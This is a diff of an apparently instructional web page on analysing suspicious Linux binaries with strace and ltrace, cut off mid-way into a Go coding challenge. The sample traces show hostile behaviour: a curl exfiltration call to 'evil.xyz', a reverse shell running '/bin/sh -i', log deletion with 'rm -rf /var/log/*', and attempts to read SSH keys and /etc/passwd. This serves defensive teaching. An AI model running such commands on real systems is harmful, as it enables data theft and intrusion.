-							a known file. If it finds it, the behavior changes. This is an environment-specific payload.
-							<ul>
-								<li>Success on <code>/var/run/docker.sock</code> or <code>/run/podman/podman.sock</code> : The binary accessed a container runtime socket - it will try to escape the container.</li>
-							</ul>
-						</p>
+						<p>Each error is a capability probe: - <code>EACCES</code> on <code>/root/.ssh/id_rsa</code> : The binary tried to steal root's <abbr title="Secure Shell">SSH</abbr> key. It lacks permissions. This tells you the binary runs as non-root and targets privilege escalation. - <code>ENOENT</code> on <code>/opt/secret_key.pem</code> : The binary looks for a known file. If it finds it, the behavior changes. This is an environment-specific payload.<ul>
+	<li>Success on <code>/var/run/docker.sock</code> or <code>/run/podman/podman.sock</code> : The binary accessed a container runtime socket - it will try to escape the container.</li>
+</ul></p>
 						<p>Network connection errors:</p>
 						<pre class="plaintext">
 connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr(&#34;185.234.72.18&#34;)}, 16) = -1 ENETUNREACH (Network is unreachable)
 connect(3, {sa_family=AF_INET, sin_port=htons(4445), sin_addr=inet_addr(&#34;10.0.1.50&#34;)}, 16) = -1 ETIMEDOUT (Connection timed out)
 connect(3, {sa_family=AF_INET, sin_port=htons(4446), sin_addr=inet_addr(&#34;127.0.0.1&#34;)}, 16) = 0
 						</pre>
-						<p>
-							The binary has three
-							<abbr title="Command and Control">C2</abbr>
-							addresses. It tries them sequentially. The first
-							is unreachable (no route), the second times out (firewall block), the third succeeds (localhost
-							<ul>
-								<li>a backconnect listener). This is <abbr title="Command and Control">C2</abbr> failover logic.</li>
-							</ul>
-						</p>
+						<p>The binary has three <abbr title="Command and Control">C2</abbr> addresses. It tries them sequentially. The first is unreachable (no route), the second times out (firewall block), the third succeeds (localhost<ul>
+	<li>a backconnect listener). This is <abbr title="Command and Control">C2</abbr> failover logic.</li>
+</ul></p>
 					</section>
 					<section>
 						<h3 id="practical-malware-analysis-scenarios">Practical Malware Analysis Scenarios</h3>
@@ -815,15 +564,7 @@ rename(&#34;/home/user/Documents/report.docx&#34;, &#34;/home/user/Documents/rep
 unlink(&#34;/home/user/Documents/report.docx&#34;) = 0
 ...
 						</pre>
-						<p>
-							The binary: opens a file, reads it, writes encrypted data to a new file, renames the original
-							with a
-							<code>.encrypted</code>
-							extension, then deletes the original. This is ransomware encryption. The
-							<code>.encrypted</code>
-							extension is the IoC. The sequential access pattern (iterate all user files) is
-							visible in the open/read/write sequence.
-						</p>
+						<p>The binary: opens a file, reads it, writes encrypted data to a new file, renames the original with a <code>.encrypted</code> extension, then deletes the original. This is ransomware encryption. The <code>.encrypted</code> extension is the IoC. The sequential access pattern (iterate all user files) is visible in the open/read/write sequence.</p>
 						<h4 id="scenario-2-reverse-shell-botnet">Scenario 2: Reverse Shell Botnet</h4>
 						<pre class="plaintext">
 $ strace -f ./botnet_sample.bin
@@ -834,24 +575,7 @@ dup2(3, 1)                              = 1
 dup2(3, 2)                              = 2
 execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-i&#34;], ...) = 0
 						</pre>
-						<p>
-							The binary connects to
-							<code>1.2.3.4:1337</code>
-							, then calls
-							<code>dup2()</code>
-							to redirect stdin (0), stdout (1),
-							and stderr (2) to the socket. Then it exec's
-							<code>/bin/sh -i</code>
-							(interactive shell). The
-							<abbr title="Command and Control">C2</abbr>
-							server now has a fully interactive shell on the victim - stdin from
-							<abbr title="Command and Control">C2</abbr>
-							goes to bash, bash's output goes to
-							<abbr title="Command and Control">C2</abbr>
-							. This is a reverse shell. The
-							<code>dup2</code>
-							calls are the giveaway.
-						</p>
+						<p>The binary connects to <code>1.2.3.4:1337</code> , then calls <code>dup2()</code> to redirect stdin (0), stdout (1), and stderr (2) to the socket. Then it exec's <code>/bin/sh -i</code> (interactive shell). The <abbr title="Command and Control">C2</abbr> server now has a fully interactive shell on the victim - stdin from <abbr title="Command and Control">C2</abbr> goes to bash, bash's output goes to <abbr title="Command and Control">C2</abbr> . This is a reverse shell. The <code>dup2</code> calls are the giveaway.</p>
 						<h4 id="scenario-3-filelessbuffer-only-payload">Scenario 3: Fileless/Buffer-Only Payload</h4>
 						<pre class="plaintext">
 $ strace -e trace=network,memory ./buffer_only.bin
@@ -863,32 +587,11 @@ mmap(NULL, 98304, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1,
 mprotect(0x7f1234560000, 98304, PROT_READ|PROT_EXEC) = 0
 # ... executes code at mmap&#39;d address ...
 						</pre>
-						<p>
-							The binary receives an ELF payload over the network,
-							<code>mmap</code>
-							s an RWX region, copies the payload
-							there, changes permissions to RX, then branches to it. Nothing ever touches the filesystem.
-							This is a fileless dropper - straight from network to memory to execution.
-						</p>
+						<p>The binary receives an ELF payload over the network, <code>mmap</code> s an RWX region, copies the payload there, changes permissions to RX, then branches to it. Nothing ever touches the filesystem. This is a fileless dropper - straight from network to memory to execution.</p>
 					</section>
 					<section>
 						<h3 id="ltrace-library-call-tracing">ltrace: Library Call Tracing</h3>
-						<p>
-							<code>strace</code>
-							traces kernel syscalls.
-							<code>ltrace</code>
-							traces libc function calls -
-							<code>fopen()</code>
-							,
-							<code>system()</code>
-							,
-							<code>strcmp()</code>
-							,
-							<code>malloc()</code>
-							,
-							<code>popen()</code>
-							. These are user-space functions, not syscalls.
-						</p>
+						<p><code>strace</code> traces kernel syscalls. <code>ltrace</code> traces libc function calls - <code>fopen()</code> , <code>system()</code> , <code>strcmp()</code> , <code>malloc()</code> , <code>popen()</code> . These are user-space functions, not syscalls.</p>
 						<pre class="plaintext">
 $ ltrace ./unknown.bin
 fopen(&#34;/etc/passwd&#34;, &#34;r&#34;)                                  = 0x55555556a2a0
@@ -897,14 +600,10 @@ strstr(&#34;root:x:0:0:root:/root:/bin/bash&#34;, &#34;:/bin/bash&#34;)    = &#3
 system(&#34;curl http://evil.xyz/exfil -d @/tmp/data.tar.gz&#34;)  = 0
 fclose(0x55555556a2a0)                                     = 0
 						</pre>
-						<p>
-							libc functions reveal intent at a higher level than syscalls: -
-							<code>fopen(&#34;/etc/passwd&#34;, &#34;r&#34;)</code>
-							<ul>
-								<li>the binary explicitly opens the password file (not just any file at that path). - <code>strstr()</code> searching for <code>:/bin/bash</code> - it looks for accounts with bash shells (interactive login accounts).</li>
-								<li><code>system(&#34;curl ...&#34;)</code> - it runs a shell command to exfiltrate data.</li>
-							</ul>
-						</p>
+						<p>libc functions reveal intent at a higher level than syscalls: - <code>fopen(&#34;/etc/passwd&#34;, &#34;r&#34;)</code><ul>
+	<li>the binary explicitly opens the password file (not just any file at that path). - <code>strstr()</code> searching for <code>:/bin/bash</code> - it looks for accounts with bash shells (interactive login accounts).</li>
+	<li><code>system(&#34;curl ...&#34;)</code> - it runs a shell command to exfiltrate data.</li>
+</ul></p>
 						<h4 id="strace-vs-ltrace">strace vs ltrace</h4>
 						<table>
 							<thead>
@@ -962,13 +661,7 @@ fclose(0x55555556a2a0)                                     = 0
 						<pre class="plaintext">
 $ strace -o syscall.log ltrace -o library.log ./unknown.bin
 						</pre>
-						<p>
-							Correlate the logs. A
-							<code>system(&#34;rm -rf /var/log/*&#34;)</code>
-							in ltrace maps to
-							<code>execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;rm -rf /var/log/*&#34;], ...)</code>
-							in strace.
-						</p>
+						<p>Correlate the logs. A <code>system(&#34;rm -rf /var/log/*&#34;)</code> in ltrace maps to <code>execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;rm -rf /var/log/*&#34;], ...)</code> in strace.</p>
 						<pre class="plaintext">
 $ grep &#39;system&#39; library.log | while read line; do
     echo &#34;Library: $line&#34;
@@ -992,35 +685,15 @@ $ strace -fp 12345 -e trace=network,file
 					</section>
 					<section>
 						<h3 id="injecting-errors-for-behavioral-analysis">Injecting Errors for Behavioral Analysis</h3>
-						<p>
-							<code>strace</code>
-							can inject failures into specific syscalls to test the binary's error handling:
-						</p>
+						<p><code>strace</code> can inject failures into specific syscalls to test the binary's error handling:</p>
 						<pre class="plaintext">
 $ strace -e inject=connect:error=ENETUNREACH ./unknown.bin
 						</pre>
-						<p>
-							Every
-							<code>connect()</code>
-							call returns
-							<code>ENETUNREACH</code>
-							, regardless of actual network state. This reveals
-							the binary's fallback behavior - does it try the next
-							<abbr title="Command and Control">C2</abbr>
-							? Does it sleep
-							and retry? Does it crash?
-						</p>
+						<p>Every <code>connect()</code> call returns <code>ENETUNREACH</code> , regardless of actual network state. This reveals the binary's fallback behavior - does it try the next <abbr title="Command and Control">C2</abbr> ? Does it sleep and retry? Does it crash?</p>
 						<pre class="plaintext">
 $ strace -e inject=openat:error=EACCES ./unknown.bin
 						</pre>
-						<p>
-							Every
-							<code>openat()</code>
-							returns
-							<code>EACCES</code>
-							. The binary cannot read any files. Observe how it handles
-							this - does it exit cleanly? Does it attempt alternative paths?
-						</p>
+						<p>Every <code>openat()</code> returns <code>EACCES</code> . The binary cannot read any files. Observe how it handles this - does it exit cleanly? Does it attempt alternative paths?</p>
 					</section>
 					<section>
 						<h3 id="building-an-analysis-sandbox">Building an Analysis Sandbox</h3>
@@ -1043,12 +716,7 @@ $ podman run --rm -it \
 							<li><code>no-new-privileges</code> : setuid binaries cannot gain privileges.</li>
 							<li><code>:ro</code> (read-only volume): The binary cannot write to the host.</li>
 						</ul>
-						<p>
-							The trace output is saved inside the container (
-							<code>/tmp/trace.log</code>
-							). After execution, copy it
-							out:
-						</p>
+						<p>The trace output is saved inside the container ( <code>/tmp/trace.log</code> ). After execution, copy it out:</p>
 						<pre class="plaintext">
 $ podman cp malware_sandbox:/tmp/trace.log ./trace.log
 $ podman rm malware_sandbox
@@ -1203,17 +871,7 @@ if __name__ == &#39;__main__&#39;:
 					</section>
 					<section>
 						<h3 id="challenge">Challenge</h3>
-						<p>
-							Write a Go tool that parses an
-							<code>strace -f -o trace.log</code>
-							capture and prints three lists: the
-							files opened, the network endpoints contacted, and the executables spawned. Run it on the trace
-							of a shell that downloads and runs a script, then extend it to flag
-							<code>ptrace</code>
-							and
-							<code>PROT_EXEC</code>
-							mappings.
-						</p>
+						<p>Write a Go tool that parses an <code>strace -f -o trace.log</code> capture and prints three lists: the files opened, the network endpoints contacted, and the executables spawned. Run it on the trace of a shell that downloads and runs a script, then extend it to flag <code>ptrace</code> and <code>PROT_EXEC</code> mappings.</p>
 						<pre class="go">
 package main
 
